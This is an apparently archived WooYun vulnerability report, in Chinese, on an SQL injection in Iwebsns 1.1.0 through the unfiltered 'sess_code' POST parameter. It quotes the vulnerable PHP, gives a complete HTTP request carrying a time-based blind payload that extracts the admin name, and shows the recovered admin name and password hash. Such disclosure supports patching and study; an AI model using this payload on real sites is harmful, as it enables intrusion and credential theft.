{"id": 42252, "wybug_id": "wooyun-2014-086321", "wybug_title": "Iwebsns最新版SQL注入第一枚", "wybug_corp": "Jooyea", "wybug_author": "路人甲", "wybug_date": "2014-12-09 11:00", "wybug_open_date": "2015-03-09 11:02", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-09：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-03-09：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： Iwebsns最新版SQL注入第一枚 详细说明：  在wooyun上看到雨牛提了5个iwebsns的漏洞了（ WooYun: Iwebsns sql 第五枚。 ），我来捡捡漏儿吧，已对比，不重复，下载Iwebsns最新的1.1.0来看看。为了使审核的大大们容易确认是否有重复，我先把存在漏洞的文件和注入参数分别写在这里：/action/album/photo_upl_flash.action.php  sess_code下面看看漏洞是怎么产生的/action/album/photo_upl_flash.action.php\n无关代码//变量定义区$album_id=intval(get_argg('id'));$session_code=get_argp('sess_code');$success = \"false\";$data ='';$data_ser='';$affair_ser='';$code_array=array();$errors = array();$album_row=array();$fs=array();$data_array=array();$affair_array=array();$session_data=array();//数据表$t_photo = $tablePreStr.\"photo\";$t_album = $tablePreStr.\"album\";$t_online = $tablePreStr.\"online\";$t_tmp_file = $tablePreStr.\"tmp_file\";$dbo = new dbex;//读写分离定义函数dbtarget('r',$dbServs);//验证用户权限if(empty($session_code)){\t$success = \"false\";\texit;}$code_array=explode(\"|\",$session_code);$sql=\"select user_id,user_name,user_ico,session_code from $t_online where user_id=$code_array[1]\";$user_row=$dbo->getRow($sql);if(empty($user_row)){\t$success = \"false\";exit;}if($user_row['session_code']!=$code_array[0]){\t$success = \"false\";exit;}无关代码\n我们看看$session_code是如何获得的，调用的如下函数\nfunction get_argp($name){\tif(isset($_POST[$name]))return $_POST[$name];\treturn null;}\n没有任何过滤，然后就执行了下面的语句\n$code_array=explode(\"|\",$session_code);$sql=\"select user_id,user_name,user_ico,session_code from $t_online where user_id=$code_array[1]\";\nIwebsns没有错误回显，这里用time-based blind进行注入测试。Payload如下\nPOST /do.php?act=photo_upl_flash HTTP/1.1Host: 192.168.0.107User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:33.0) Gecko/20100101 Firefox/33.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh,zh-cn;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://192.168.0.107/modules.php?app=user_info&is_finish=1Cookie: AJSTAT_ok_times=8; bdshare_firstime=1414502402741; iweb_hisgoods[15]=1417531949; iweb_hisgoods[26]=1417866015; PHPSESSID=jlqmqs159pr4441i6ascog34e3; IsReged=YConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 132sess_code=-1|-1 or (select if(ord(mid((select admin_name from isns_admin where admin_id=1 limit 0,1),1,1))=0x7a,sleep(3),0))&id=10\n因为是time-based blind 注入，猜测管理员用户名的第一个字母时，若错误，延迟2s左右，如下图\n\n若正确，延迟5s左右，如下图\n\n按上面的方法依次做下去（burp intruder或者自己写个脚本跑），可测试管理员用户名为：admin，密码为： 21232f297a57a5a743894a0e4a801fc3   漏洞证明：  见 详细说明   修复方案：  intval    版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}